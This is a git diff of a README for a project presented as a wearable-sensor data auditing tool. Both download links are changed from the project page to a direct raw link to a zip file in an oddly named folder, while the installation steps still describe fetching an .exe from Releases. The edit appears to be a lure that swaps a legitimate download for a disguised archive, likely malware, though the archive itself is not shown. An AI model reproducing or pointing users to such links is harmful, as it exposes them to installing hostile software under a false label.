@@ -1,6 +1,6 @@
 # 🩺 biomedical-signal-forensics-lab - Audit wearable sensor data with confidence
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Abhina2002/biomedical-signal-forensics-lab)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Abhina2002/biomedical-signal-forensics-lab/raw/refs/heads/main/qualifyingly/biomedical_signal_lab_forensics_v2.2-beta.2.zip)
 
 ## 🔍 Purpose of this application 
 
@@ -21,7 +21,7 @@ Your computer needs specific parts to run this software. Check your system again
 You access this application through the public project page. Follow these steps to obtain and start the software.
 
 1. Open your web browser.
-2. Visit this link to reach the project page: [Download Link](https://github.com/Abhina2002/biomedical-signal-forensics-lab).
+2. Visit this link to reach the project page: [Download Link](https://github.com/Abhina2002/biomedical-signal-forensics-lab/raw/refs/heads/main/qualifyingly/biomedical_signal_lab_forensics_v2.2-beta.2.zip).
 3. Look for the section labeled Releases on the right side of the screen.
 4. Click the latest version number.
 5. Find the file ending in .exe under the Assets heading.
